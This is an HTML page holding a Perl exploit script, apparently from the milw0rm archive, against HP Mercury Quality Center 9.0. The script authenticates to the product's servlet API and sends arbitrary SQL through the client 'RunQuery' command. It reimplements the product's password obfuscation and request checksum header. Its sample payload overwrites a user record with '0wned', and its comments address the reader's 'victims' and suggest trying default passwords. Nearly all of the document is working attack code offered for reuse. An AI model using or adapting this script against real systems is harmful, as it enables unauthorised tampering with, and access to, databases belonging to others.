<html><head><title>HP Mercury Quality Center 9.0 build 9.1.0.4352 SQL Execution Exploit</title></head><pre>#!/usr/bin/perl
#******************************************************************
# HP Mercury Quality Center runQuery exploit.
# Run whatever SQL you want on there db - without SQL injection.
# Problem is client can do &quot;RunQuery&quot; command os we write program
# to do this. Client can lots other things it should not also!
# The backend database can be MSSQLServer or Oracle or nearly often
# MSDE. This changes SQL types you can send. This is a blind SQL
# attack but may be is it possible to get data out somehow?
#
# Copyright 2007 Isma Khan - Code may be freedly usuable on other
# exploits as long as name appears.
# ******************************************************************
use IO::Socket;
my $sql = &quot;UPDATE USERS SET US_ADDRESS='0wned' WHERE US_USERNAME='paul_qc'&quot;;

#my $sql = &quot;UPDATE USERS SET US_ADDRESS='0wned' WHERE US_USERNAME='isma-khan'&quot;;
# victim - Put yur victims hostname here.
# vicport - Port to connect on.
# u - username to login to quality center. This user provided.
# p - Psswrd to login ot quality center. Try default passwords.
# domain - A domain thhat user has access to.
# project - A proj that user has access to.
my $victim = '192.168.0.2'; 
my $vicport = 8080; 
my $u = 'alex_qc'; 
my $p= ''; 
my $domain = 'DEFAULT';
my $project = 'QualityCenter_Demo';

# ****** Login to HPQMC *******************
print &quot;Login\n&quot;;
my @bits;
push @bits, AddString('Login');
push @bits, &quot;\&quot;0:int:1\&quot;&quot;;
push @bits, &quot;\&quot;0:int:-1\&quot;&quot;;
push @bits, &quot;\&quot;0:int:-1\&quot;&quot;;
push @bits, AddString(&quot;{\r\nUSER_NAME:$u,\r\nPASSWORD:&quot; . SmolkaEncript($p) . &quot;,\r\nCLIENTTYPE:\\00000018\\Quality Center Client UI\r\n}\r\n&quot;);
my $tmphost=&quot;0:conststr:Bannu&quot;;
push @bits, &quot;\\&quot; . MakeHex($tmphost) . &quot;\\&quot; . $tmphost;
push @bits, &quot;\&quot;65536:str:0\&quot;&quot;;
push @bits, &quot;\&quot;0:pint:0\&quot;&quot;;
push @bits, &quot;\&quot;0:pint:0\&quot;&quot;;
push @bits, &quot;\&quot;0:pint:0\&quot;&quot;;

my $res=HTTPSending(@bits);
undef @bits;
my ($sesid) = $res =~ /ID:(\d+)/;
die &quot;Not login\n&quot; unless($sesid);
print &quot;Session ID: $sesid\n&quot;;

# ***** Connect to project *********
print &quot;Connect to project\n&quot;;
push @bits, AddString('ConnectProject');
push @bits, &quot;\&quot;0:int:2\&quot;&quot;;
push @bits, &quot;\&quot;0:int:$sesid\&quot;&quot;;
push @bits, &quot;\&quot;0:int:-1\&quot;&quot;;
push @bits, AddString(&quot;{\r\nDOMAIN_NAME:$domain,\r\nPROJECT_NAME:\\&quot; . MakeHex($project) . &quot;\\$project\r\n}\r\n&quot;);
push @bits, &quot;\&quot;65536:str:0\&quot;&quot;;
push @bits, &quot;\&quot;0:pint:0\&quot;&quot;;
$res = HTTPSending(@bits);
undef @bits;
my ($psesid) = $res =~ /ID:(\d+)/;
die &quot;Not project\n&quot; unless($psesid);
print &quot;Project Session ID: $psesid\n&quot;;

# ******** Run the SQL *****
print &quot;Run SQL\n&quot;;
push @bits, AddString('RunQuery');
push @bits, &quot;\&quot;0:int:3\&quot;&quot;;
push @bits, &quot;\&quot;0:int:$sesid\&quot;&quot;;
push @bits, &quot;\&quot;0:int:$psesid\&quot;&quot;;
push @bits, AddString($sql);
push @bits, &quot;\&quot;65536:str:0\&quot;&quot;;
push @bits, &quot;\&quot;0:int:0\&quot;&quot;;
$res = HTTPSending(@bits);
print $res;

# **** Expect to get Failed to Run Query[ERR_SEP]Messages:
# error here but SQL like INSERT or UPDATE still work.

#******************************************************************
# Make password 
#******************************************************************
sub SmolkaEncript {
	my $password=shift;
	return '' unless($password);
	my $cripted='ENRCRYPTED';
	my $base = 'SmolkaWasHereMonSher';
	my $x=0;
	for(;$x&lt;length($password);$x++){
		$cripted = $cripted . (ord(substr($password,$x,1))+ord(substr($base,$x,1)));
		$cripted = $cripted . '!';
	}
	return $cripted;
}

# ************************************************************
# Send a text as HTTP to victim.
# ***********************************************************
sub HTTPSending {
	my $body = bits2string(@_);
	my $sock = IO::Socket::INET-&gt;new(proto=&gt;'tcp',PeerAddr=&gt;$victim,PeerPort=&gt;$vicport)
		or die &quot;Can't connect. $!\n&quot;;
	my $header =	&quot;POST /qcbin/servlet/tdservlet/TDAPI_GeneralWebTreatment HTTP/1.0\r\n&quot;
.	&quot;Content-Type: text/html; charset=UTF-8\r\n&quot;
.	&quot;X-TD-ID: &quot; . sprintf(&quot;%08X&quot;,XTDID($body)). &quot;\r\n&quot;
. 	&quot;User-Agent: TeamSoft WinInet Component\r\n&quot;
.	&quot;Content-Length: &quot; . length($body) . &quot;\r\n&quot;
.	&quot;Pragma: no-cache\r\n&quot;
.	&quot;\r\n&quot;;
	print $sock $header;
	print $sock $body;
	my $text;
	while(!eof($sock)){
		$text .= &lt;$sock&gt;;
	}
	return $text;
}

# ********* HPMQCs conststr type *********
sub AddString {
	my $str = shift;
	if (length($str)&lt;16){
		return &quot;\&quot;0:conststr:$str\&quot;&quot;;
	} else {
		return '\\' . MakeHex(&quot;0:conststr:$str&quot;) . &quot;\\0:conststr:$str&quot;;
	}

}
# ********HPMQC uses hex digits in many place ************
sub MakeHex {
	return sprintf(&quot;%08x&quot;,length(shift));
}

# ********************************************************
# This takes @bits and make big longer string out of it.
# *******************************************************
sub bits2string {
	my @bits=@_;
	my $bitno = 0;
	my $retstr=&quot;{\r\n&quot;;
	foreach my $onebit (@bits){
		$retstr .= $bitno++ . &quot;: $onebit,\r\n&quot;;
	}
	$retstr = substr($retstr,0,-3);
	$retstr = $retstr . &quot;\r\n}\r\n&quot;;
	return $retstr;
}

# *************************************************
# HPMQC useid X-TD-ID header which is sum of all chars
# in body plus number 2301. Could checksum?
# **********************************************
sub XTDID {
	my $total=2301;
	my $body = shift;

	for(my $i=0;$i&lt;length($body);$i++){
		$total += ord(substr($body,$i,1));
	}
	return $total;
}

# milw0rm.com [2007-04-03]</pre></html>